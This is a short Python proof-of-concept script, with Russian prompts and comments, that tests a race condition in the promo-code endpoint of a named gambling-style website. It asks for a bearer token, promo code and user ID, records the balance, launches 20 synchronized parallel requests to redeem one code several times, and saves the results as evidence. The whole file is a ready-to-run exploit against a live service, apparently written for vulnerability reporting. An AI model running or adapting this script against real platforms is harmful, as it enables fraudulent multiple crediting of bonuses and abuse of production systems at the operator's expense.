# bug5_poc.py
import requests
import threading
import time
import json

BASE = "https://1xlite-03801.world"
TOKEN = input("вставь Bearer token: ").strip()
CODE = input("вставь промокод: ").strip()
USER_ID = int(input("вставь свой userId: "))

URL = BASE + "/service-api/third-party/promocodes/UsePromocode"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json",
    "Origin": BASE
}
BODY = {"code": CODE, "userId": USER_ID}

# сначала узнаем баланс до теста
print("получаю баланс до теста...")
bal_r = requests.post(
    BASE + "/web-api/api/internal/v1/account/getbalance",
    json={"userId": USER_ID},
    headers=HEADERS
)
print(f"баланс запрос: {bal_r.status_code} | {bal_r.text[:200]}")

results = []
lock = threading.Lock()
barrier = threading.Barrier(20)

def use_promo(idx):
    barrier.wait()  # все потоки стартуют одновременно
    start = time.time()
    r = requests.post(URL, json=BODY, headers=HEADERS)
    elapsed = time.time() - start
    with lock:
        results.append({
            "thread": idx,
            "status": r.status_code,
            "elapsed_ms": round(elapsed * 1000),
            "response": r.text[:200]
        })
        print(f"поток {idx:2d}: {r.status_code} ({round(elapsed*1000)}ms) | {r.text[:80]}")

print(f"\nзапускаю 20 параллельных запросов на промокод {CODE}...")
threads = [threading.Thread(target=use_promo, args=(i,)) for i in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

success = [r for r in results if r["status"] == 200]
print(f"\n=== результат ===")
print(f"всего запросов: {len(results)}")
print(f"успешных (200): {len(success)}")

if len(success) > 1:
    print(f"\n=== КРИТИЧНО: race condition подтверждена! ===")
    print(f"промокод применен {len(success)} раз вместо 1")

with open("bug5_evidence.json", "w") as f:
    json.dump({
        "promo_code": CODE,
        "total_requests": len(results),
        "successful_applications": len(success),
        "details": results
    }, f, indent=2)
print("\nсохранено в bug5_evidence.json")
print("сделай скриншот баланса сейчас и сравни с начальным")
